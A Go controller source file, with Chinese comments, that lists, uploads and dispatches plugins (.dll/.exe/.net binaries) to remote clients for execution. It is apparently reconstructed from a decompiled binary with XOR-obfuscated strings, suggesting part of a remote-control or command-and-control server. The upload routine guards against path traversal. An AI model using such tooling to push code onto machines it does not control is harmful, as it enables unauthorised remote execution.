// Package controllers — 插件(Runner)控制器，1:1 对齐原版二进制。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	List       0x18ed8a0   GET  /runner/list       插件列表
//	RunPlugin  0x18edd80   POST /runner/runplugin  下发插件执行
//	Upload     0x18eeb00   POST /runner/upload     上传插件
//
// 反编译参数集：
//
//	List:      id / name
//	RunPlugin: id / name（插件名，按 .dll/.exe/.net 及 amd64 架构选择平台插件）
//	Upload:    file
package controllers

import (
	"errors"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

// RunnerController 管理插件（runner）列表与下发。
type RunnerController struct {
	ApiBaseController
}

// List 返回服务器插件列表（GET /runner/list）。
// 反编译（0x18ed8a0）：目录 "./plugins"（9B XOR 数组 81 72 55 89 f3 85 0e d8 18
// ^ af 5d 25 e5 86 e2 67 b6 6b）经 FUN_005e8cc0 ReadDir；响应 = [{id: 下标,
// name: 条目名}]（FUN_00412ae0 建图，键 DAT_01bd6866="id" / DAT_01bd7df9="name"），
// JsonOkResult 直接返回列表（无 "plugins" 包装键）。
func (c *RunnerController) List() {
	plugins := engineListPlugins()
	c.JsonOkResult(plugins)
}

// RunPlugin 下发插件到客户端执行（POST /runner/runplugin）。
// 反编译（0x18edd80）参数：id（客户端）/ name（插件名）；原版按
// .dll / .exe / .net 后缀与 amd64 架构选取对应平台的插件二进制下发。
func (c *RunnerController) RunPlugin() {
	id := int64(c.JsonGetInt("id"))
	name := c.JsonGetStr("name")
	if id == 0 || name == "" {
		c.JsonErr("id and name required")
		return
	}
	lower := strings.ToLower(name)
	// 原版按扩展名选择插件类型（RunPlugin 反编译字符串：.dll / .exe / .net）
	_ = lower
	dispatchCmd(id, "runplugin "+name)
	c.JsonOkMessage("ok")
}

// Upload 上传插件（POST /runner/upload）。参数：file。
func (c *RunnerController) Upload() {
	file, header, err := c.GetFile("file")
	if err != nil {
		c.JsonErr("upload failed: " + err.Error())
		return
	}
	defer file.Close()
	if err := engineSavePlugin(header.Filename, file); err != nil {
		c.JsonErr("save plugin failed: " + err.Error())
		return
	}
	c.JsonOkMessage("ok")
}

// ---- 引擎阶段对齐 ----

func engineListPlugins() []map[string]interface{} {
	// 反编译：FUN_005e8cc0("./plugins") 读目录，逐项 {id: 下标, name: 名称}
	entries, err := os.ReadDir(pluginsDir)
	if err != nil {
		return []map[string]interface{}{}
	}
	list := make([]map[string]interface{}, 0, len(entries))
	for i, e := range entries {
		list = append(list, map[string]interface{}{
			"id":   i,
			"name": e.Name(),
		})
	}
	return list
}

// pluginsDir 是插件目录（原版 "./plugins"，反编译字符串已解）。
const pluginsDir = "./plugins"

// engineSavePlugin 把上传的插件写入插件目录（原版 RunnerController.Upload
// 保存到 ./plugins 后由 engineListPlugins 列出）。
//
// 文件名来自 HTTP 头，必须剥离路径：否则 "../../x" 之类的名字会写到目录之外。
func engineSavePlugin(name string, src io.Reader) error {
	base := filepath.Base(filepath.FromSlash(name))
	if base == "." || base == ".." || base == string(filepath.Separator) || base == "" {
		return errors.New("invalid plugin name")
	}
	if err := os.MkdirAll(pluginsDir, 0o755); err != nil {
		return err
	}
	dst, err := os.OpenFile(filepath.Join(pluginsDir, base), os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o755)
	if err != nil {
		return err
	}
	defer dst.Close()
	if _, err := io.Copy(dst, src); err != nil {
		return err
	}
	log.Printf("[runner] saved plugin %s", base)
	return nil
}
